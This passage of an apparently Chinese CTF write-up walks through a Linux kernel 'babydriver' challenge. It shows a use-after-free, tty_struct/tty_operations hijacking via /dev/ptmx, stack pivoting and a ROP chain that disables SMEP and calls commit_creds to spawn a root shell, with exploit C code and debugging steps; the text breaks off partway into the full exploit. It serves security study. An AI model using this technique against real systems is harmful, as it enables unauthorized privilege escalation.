+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2023-11-28_19-27-47.png"
+                      alt="nipaste_2023-11-28_19-27-4"
+                ></p>
+<p>​	同 write 差不多。</p>
+<h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p>​	首先来学习一下这道题的 UAF 是如何利用的，前面提到过在 release 的时候 kfree 未将指针置空，我们来看看这样会造成什么结果。</p>
+<h4 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a><strong>UAF</strong></h4><p>​	大家应该对 open 这个系统调用不陌生，来回顾一下这个过程，当尝试打开一个文件时，内核并不会直接去文件系统中找这个文件，而是先去系统文件打开表中，查找该文件是否已经被打开，若已经打开，则直接返回指向对应打开文件表中表项的指针；若没有打开，则会去文件系统找到该文件的 inode 并将其加载到内存，在系统文件打开表中为其添加表项，然后返回对应指针给用户。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2023-11-28_19-48-03.png"
+                      alt="nipaste_2023-11-28_19-48-0"
+                ></p>
+<p>​	两次对同一个文件open后的效果大致如上图所示，由于其申请的 object 储存在全局变量中，这时如果我们在 close 第一个打开文件（fd1）时，会执行 release 后，但我们仍然可以通过 fd2 来实现控制已经被释放的堆块，弄懂这一点，其实这道题已经迎刃而解了。</p>
+<h4 id="tty-struct"><a href="#tty-struct" class="headerlink" title="tty_struct"></a><strong>tty_struct</strong></h4><p>​	为了通过 UAF 劫持程序执行流，可以选择 tty_struct 结构体进行漏洞利用。</p>
+<p><strong>参考资料（</strong><a target="_blank" rel="noopener" href="https://arttnba3.cn/"><strong>arttnba3</strong></a><strong>）：</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在 /dev 下有一个伪终端设备 ptmx ，在我们打开这个设备时内核中会创建一个 tty_struct 结构体，与其他类型设备相同，tty驱动设备中同样存在着一个存放着函数指针的结构体 tty_operations</span><br><span class="line"></span><br><span class="line">那么我们不难想到的是我们可以通过 UAF 劫持 /dev/ptmx 这个设备的 tty_struct 结构体与其内部的 tty_operations 函数表，那么在我们对这个设备进行相应操作（如write、ioctl）时便会执行我们布置好的恶意函数指针</span><br><span class="line"></span><br><span class="line">由于没有开启SMAP保护，故我们可以在用户态进程的栈上布置ROP链与fake tty_operations结构体</span><br></pre></td></tr></table></figure></div>
+
+<p>​	这是一个非常有用的结构体，在 kernel pwn 中利用频率也是非常的高。</p>
+<p>源码链接：<a class="link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.4.298/source/include/linux/tty.h#L259" >https://elixir.bootlin.com/linux/v4.4.298/source/include/linux/tty.h#L259 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2023-11-28_20-06-24.png"
+                      alt="nipaste_2023-11-28_20-06-2"
+                ></p>
+<p>​	截取其中一部分进行分析，上图中有两个需要关注的点，</p>
+<ul>
+<li>一个是 magic 这里保存的是一个魔数，我们可以通过该数据来判断我们是否正确定位到 tty_struct 结构体。	</li>
+<li>另外一个就是我们这题中用到的比较重要的东西，就是 <code>tty_operations</code>，顾名思义实际上它就是一个函数表，里面保存有各种函数的函数指针（有点类似于用户态的 _IO_file_jumps 结构体）。</li>
+</ul>
+<p>​	那我们就可以联想到，如果能够劫持这些函数指针，就能够劫持程序执行流。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2023-11-28_20-12-58.png"
+                      alt="nipaste_2023-11-28_20-12-5"
+                ></p>
+<p>​	从上图可以看到，tty_operations 中定义了各种函数指针，这里有两种劫持方法，</p>
+<p>第一种是直接劫持上面 tty_stuct 中 tty_operations 的指针，让其指向 fake_tty_operations（我们这道题目采用的方法）。</p>
+<p>第二种是可以考虑劫持 tty_operations 中的指针，也能达到同样的效果。</p>
+<h4 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h4><p>​	说这么多不如直接上手，来结合动调来分析吧，也可以说下我对这道题动调的思路。</p>
+<p>​	由于上次在学习 ret2usr 时，我是从exp写的顺序进行分析的，但感觉那样效果并不好，因为那并不是我们做题时的顺序，例如虽然我们总是提前布置好 ROP，但总是最后才调用，所以我打算从做题顺序来一步一步进行分析，更加贴近我们做题的过程。</p>
+<p><strong>step 1：save status &amp; leak addr</strong></p>
+<p>​	想必一路过来，大家应该已经熟悉 save status 已是基操了，这里不做过多说明。</p>
+<p>​	不同于强网杯 core 那道题目（下面第二张图），这道题 init 并没有限制我们读    <code>/proc/kallsyms</code>，所以我们可以通过读这个文件来获取内核函数地址。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2023-11-28_20-34-43.png"
+                      alt="nipaste_2023-11-28_20-34-4"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2023-11-28_20-34-01.png"
+                      alt="nipaste_2023-11-28_20-34-0"
+                ></p>
+<p>​	内容如下，除了前两个我们需要提权利用的函数外，在这道题目中，我们还可以稍微注意一下 alloc_tty_struct 函数，前面说过，在我们打开 ptmx 这个设备时内核中会创建一个 tty_struct 结构体，而创建该结构体的函数正是 alloc_tty_struct，所以我们后期调试可以将断点打到这个函数，来获取 tty_struct 结构体，从而用于我们分析调用链。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2023-11-28_20-37-53.png"
+                      alt="nipaste_2023-11-28_20-37-5"
+                ></p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> commit_creds=<span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred=<span class="number">0</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">find_symbols</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    FILE* kallsyms_fd = fopen(<span class="string">&quot;/proc/kallsyms&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(kallsyms_fd &lt; <span class="number">0</span>)</span><br><span class="line">        errorMsg(<span class="string">&quot;fail to open /proc/kallsyms&quot;</span>);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x30</span>];</span><br><span class="line">    <span class="keyword">while</span>(fgets(buf,<span class="number">0x30</span>,kallsyms_fd))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(commit_creds &amp;&amp; prepare_kernel_cred)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">char</span> addr_hex[<span class="number">0x20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(addr_hex,buf,<span class="number">0x10</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(addr_hex,<span class="string">&quot;%lx&quot;</span>,&amp;commit_creds);</span><br><span class="line">            printAddr(<span class="string">&quot;commit_creds&quot;</span>,commit_creds);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">char</span> addr_hex[<span class="number">0x20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(addr_hex,buf,<span class="number">0x10</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(addr_hex,<span class="string">&quot;%lx&quot;</span>,&amp;prepare_kernel_cred);</span><br><span class="line">            printAddr(<span class="string">&quot;prepare_kernel_cred&quot;</span>,prepare_kernel_cred);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    errorMsg(<span class="string">&quot;fail to find symbols&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+
+
+<p><strong>step 2：UAF</strong></p>
+<p>​	这里结合源代码在结合动调分析起来比较好一点。</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// step3: UAF</span></span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x40</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">size_t</span> fake_tty_array[<span class="number">0x20</span>];</span><br><span class="line"><span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>,<span class="number">2</span>);   <span class="comment">//2(read/write)</span></span><br><span class="line"><span class="type">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">if</span>(fd1 &lt; <span class="number">0</span> || fd2 &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    errorMsg(<span class="string">&quot;fail to open babydriver&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ioctl(fd1,<span class="number">0x10001</span>,<span class="number">0x2e0</span>);           <span class="comment">//0x2e0 == sizeof(tty_struct)</span></span><br><span class="line">close(fd1);                         <span class="comment">//UAF: fd2 still has pointer of babydev_struct</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd3 = open(<span class="string">&quot;/dev/ptmx&quot;</span>,<span class="number">2</span>);      <span class="comment">//get object(just freed baby_struct) from slab</span></span><br><span class="line"><span class="keyword">if</span>(fd3 &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    errorMsg(<span class="string">&quot;fail to open ptmx&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>​	我在做这道题时，发现这道题并不好调试，原因是最后触发调用链时，并不在我们的驱动文件中（babydriver.ko），而是在前面提到的 对 ptmx 文件进行 write 操作时进行触发，所以这里我们剑走偏锋从 alloc_tty_struct 这个函数开始跟进（后面介绍）。</p>
+<p>​	step2指的是我们的做题顺序（doge），找到驱动基址，然后添加符号下断点，同时这里我们也给 alloc_tty_struct 函数也下个断点。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/ $ cat /sys/module/babydriver/sections/.text</span><br><span class="line">0xffffffffc0000000</span><br><span class="line">/ $ cat /proc/kallsyms | grep &quot;alloc_tty_struct&quot;</span><br><span class="line">ffffffff814d9df0 T alloc_tty_struct</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2023-11-28_21-03-34.png"
+                      alt="nipaste_2023-11-28_21-03-3"
+                ></p>
+<p>​	调试启动环节如下：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2023-11-28_21-05-10.png"
+                      alt="nipaste_2023-11-28_21-05-1"
+                ></p>
+<p>​	<strong>babyrelease 函数内容如下：</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2023-11-28_21-06-55.png"
+                      alt="nipaste_2023-11-28_21-06-5"
+                ></p>
+<p>​	由于没有符号，上图中正在执行的指令就是我们的 kfree 函数，可以记住释放的 object 地址， 后面我们在打开 ptxm 文件时又会将它分配回来。 </p>
+<p>​	<strong>alloc_tty_struct 函数内容如下：</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2023-11-28_21-28-15.png"
+                      alt="nipaste_2023-11-28_21-28-1"
+                ></p>
+<p>源码链接：<a class="link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.4.298/source/drivers/tty/tty_io.c#L3173" >https://elixir.bootlin.com/linux/v4.4.298/source/drivers/tty/tty_io.c#L3173 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2023-11-28_21-26-45.png"
+                      alt="nipaste_2023-11-28_21-26-4"
+                ></p>
+<p>​	可以看到在 kzalloc 之后，返回了我们刚刚释放的空间，至此我们 UAF 的目的已经达到。</p>
+<p><strong>step3：tty_struct 利用</strong></p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">read(fd2,fake_tty_array,<span class="number">0x100</span>);</span><br><span class="line">fake_tty_array[<span class="number">3</span>] = fake_op;</span><br><span class="line">write(fd2,fake_tty_array,<span class="number">0x100</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p>​	<code>fake_tty_array[3]</code> 即是 tty_operations 的位置，这里我们修改为 fake_op 即可，动调如下：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2023-11-28_21-33-10.png"
+                      alt="nipaste_2023-11-28_21-33-1"
+                ></p>
+<p>​	这一部分紧接上面 UAF 利用之后，同时在这里介绍一种调试方法，就是通过监视指定内存空间来下断点，也就是watch，不过这里使用 awatch。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awatch *0xffff88000d505818</span><br></pre></td></tr></table></figure></div>
+
+<p>当发生读或者写的时候，都能被awatch监测到，由于我们这里是要劫持 tty_operations 指针，所以监测这一块空间就好。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2023-11-28_21-40-39.png"
+                      alt="nipaste_2023-11-28_21-40-3"
+                ></p>
+<p>​	在c一次之后，可以发现这块空间已经被初始化了，但还没有 tty_operations 指针，还没有被劫持，在 c 记下，看看是否被劫持。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2023-11-28_21-42-34.png"
+                      alt="nipaste_2023-11-28_21-42-3"
+                ></p>
+<p>​	在 c 到第四次的时候，可以发现这里已经被成功劫持为了用户空间栈上的一块地址，而这里已经保存好了我们提前布置好的 fake_op payload（在后面介绍）。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2023-11-28_21-46-52.png"
+                      alt="nipaste_2023-11-28_21-46-5"
+                ></p>
+<p>​	接下来就是如何触发劫持执行流的问题了，触发代码如下：</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">write(fd3,buf,<span class="number">0x8</span>);               <span class="comment">//hijack tty_operations pointer ==&gt; write</span></span><br></pre></td></tr></table></figure></div>
+
+<p>​	对应我们之前给的 tty_operations 结构体中 write 的偏移应该是在 0x38 的位置上，所以这里我们通过 awatch 在这块地址下一个断点，来观察执行流。</p>
+<p>​	笔者这里 c 了三下，已经执行到跳转函数指针这里，对应0x38即为我们 write 的位置，殊不知这里已经填充好了我们的 payload。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2023-11-28_21-50-41.png"
+                      alt="nipaste_2023-11-28_21-50-4"
+                ></p>
+<p>​	注意一下这里 rax 寄存器是我们栈上的一个地址，我们可考虑使用    <code>mov rsp,rax</code> 之类的gadget完成栈迁移。</p>
+<p><strong>step 4：ROP</strong></p>
+<p>​	上面已经通过 tty_struct 成功劫持程序执行流了，下面我们就只需要构造好对应的 ROP 链就好了。</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// step2: rop</span></span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> ROP[<span class="number">0x20</span>];</span><br><span class="line">ROP[i++] = pop_rdi_ret;</span><br><span class="line">ROP[i++] = <span class="number">0x6f0</span>;</span><br><span class="line">ROP[i++] = mov_cr4_rdi_pop_rbp_ret;</span><br><span class="line">ROP[i++] = <span class="number">0</span>;</span><br><span class="line">ROP[i++] = getRootPrivilege;</span><br><span class="line">ROP[i++] = swapgs_pop_rbp_ret;</span><br><span class="line">ROP[i++] = <span class="number">0</span>;</span><br><span class="line">ROP[i++] = iretq_ret;</span><br><span class="line">ROP[i++] = spawn_shell;</span><br><span class="line">ROP[i++] = user_cs;</span><br><span class="line">ROP[i++] = user_rflags;</span><br><span class="line">ROP[i++] = user_sp;</span><br><span class="line">ROP[i++] = user_ss;</span><br><span class="line">printAddr(<span class="string">&quot;ROP&quot;</span>,ROP);   </span><br><span class="line"><span class="type">size_t</span> fake_op[<span class="number">0x10</span>];</span><br><span class="line"><span class="keyword">for</span>( i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">    fake_op[i] = mov_rsp_rax_dec_ebx_ret;</span><br><span class="line">&#125;</span><br><span class="line">fake_op[<span class="number">0</span>] = pop_rax_ret;</span><br><span class="line">fake_op[<span class="number">1</span>] = ROP;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2023-11-28_21-55-27.png"
+                      alt="nipaste_2023-11-28_21-55-2"
+                ></p>
+<p>​	这一步完成第一次栈迁移。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2023-11-28_21-56-36.png"
+                      alt="nipaste_2023-11-28_21-56-3"
+                ></p>
+<p>​	栈迁移后，如上图所示，rsp 指向了 fake_op[0] 的位置，这里我们在进行一次栈迁移，迁移到 rop 头的位置，这也是为什么我们在 exp 中设置 <code>fake_op[1] = ROP;</code> 的原因。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2023-11-28_21-59-30.png"
+                      alt="nipaste_2023-11-28_21-59-3"
+                ></p>
+<p>​	从上图可以看到，栈迁移成功，可以正常走 ROP 链了。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2023-11-28_22-01-12.png"
+                      alt="nipaste_2023-11-28_22-01-1"
+                ></p>
+<p>​	可以看到，上图应该是最后着陆到用户态了，但不知道什么原因最后总会报这个错误，网上其他博客貌似也出现了这个问题，不过搞懂原理最重要啦，还是值得去学习一下的。</p>
+<p><strong>完整exp如下：</strong></p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">errorMsg</span><span class="params">(<span class="type">char</span> *msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[!] %s \033[0m\n&quot;</span>,msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">outputMsg</span><span class="params">(<span class="type">char</span> *msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[+] %s \033[0m\n&quot;</span>,msg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">printAddr</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[35m\033[1m[*] %s == %p\033[0m\n&quot;</span>,msg,value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> user_cs,user_ss,user_sp,user_rflags;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] status has been saved!\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spawn_shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    outputMsg(<span class="string">&quot;back from kernelspace&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        outputMsg(<span class="string">&quot;SUCCESSFUL GET ROOT by henry!&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        errorMsg(<span class="string">&quot;FAIL TO GET ROOT&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> commit_creds=<span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred=<span class="number">0</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">find_symbols</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    FILE* kallsyms_fd = fopen(<span class="string">&quot;/proc/kallsyms&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(kallsyms_fd &lt; <span class="number">0</span>)</span><br><span class="line">        errorMsg(<span class="string">&quot;fail to open /proc/kallsyms&quot;</span>);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x30</span>];</span><br><span class="line">    <span class="keyword">while</span>(fgets(buf,<span class="number">0x30</span>,kallsyms_fd))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(commit_creds &amp;&amp; prepare_kernel_cred)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">char</span> addr_hex[<span class="number">0x20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(addr_hex,buf,<span class="number">0x10</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(addr_hex,<span class="string">&quot;%lx&quot;</span>,&amp;commit_creds);</span><br><span class="line">            printAddr(<span class="string">&quot;commit_creds&quot;</span>,commit_creds);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">char</span> addr_hex[<span class="number">0x20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(addr_hex,buf,<span class="number">0x10</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(addr_hex,<span class="string">&quot;%lx&quot;</span>,&amp;prepare_kernel_cred);</span><br><span class="line">            printAddr(<span class="string">&quot;prepare_kernel_cred&quot;</span>,prepare_kernel_cred);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span 